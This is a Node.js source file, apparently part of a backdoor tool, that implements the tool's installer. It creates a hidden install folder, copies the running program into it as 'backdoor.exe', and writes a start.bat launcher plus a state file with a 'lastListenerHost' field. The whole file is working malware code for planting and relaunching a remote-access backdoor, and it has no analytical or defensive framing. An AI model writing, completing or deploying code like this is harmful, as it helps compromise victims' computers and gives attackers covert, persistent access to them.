const path = require('path');
const fs = require("fs");

const createInstallerDir = () => {

    const targetPath = getLocations().installationPath

    if (fs.existsSync(targetPath)) {
        return targetPath;
    }

    log("Installing...", undefined, "[Installer]")

    fs.mkdirSync(targetPath);

    return targetPath;
}

const copyItSelf = () => {
    try {
        fs.copyFileSync(path.join(getLocations().cwd, getLocations().name), path.join(getLocations().installationPath, "backdoor.exe"))
        log(`Backdoor Copied`, undefined, "[Installer]")
    } catch (e) {
        log(`Backdoor Copied Failed`, "error", "[Installer]")
    }
}

const createFiles = () => {

    const targets = [
        {
            name: "state.json",
            default: JSON.stringify({
                installedAt: Date.now(),
                lastListenerHost: null
            })
        },
        {
            name: "start.bat",
            default: `"${path.join(getLocations().installationPath, "backdoor.exe")}"`
        }
    ]

    targets.forEach(e => {

        const p = path.join(getLocations().installationPath, e.name)

        if (fs.existsSync(p)) return;

        fs.appendFileSync(p, e.default || "")

        log(`Created Missing Target: ${e.name}`, undefined, "[Installer]")

    })

}


const Installer = () => {

    createInstallerDir()

    createFiles()

    copyItSelf()

}


module.exports = Installer;